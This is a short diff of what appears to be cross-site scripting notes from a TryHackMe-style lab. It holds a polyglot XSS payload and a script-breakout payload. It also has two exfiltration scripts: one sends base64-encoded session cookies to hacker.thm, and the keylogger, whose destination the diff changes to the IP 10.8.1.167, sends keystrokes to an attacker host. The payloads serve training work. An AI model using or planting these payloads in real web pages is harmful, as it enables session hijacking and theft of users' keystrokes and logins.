@@ -42,6 +42,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stY
 </script><script>alert('XSS');</script> // Escape javascript functions
 
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> // Steal cookies such as PHPSESSID in base64, sent to hacker.thm 
-<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script> // Log keys, keys sent to hacker.thm
+<script>document.onkeypress = function(e) { fetch('https://10.8.1.167/log?key=' + btoa(e.key) );}</script> // Log keys, keys sent to hacker.thm
 
 ```
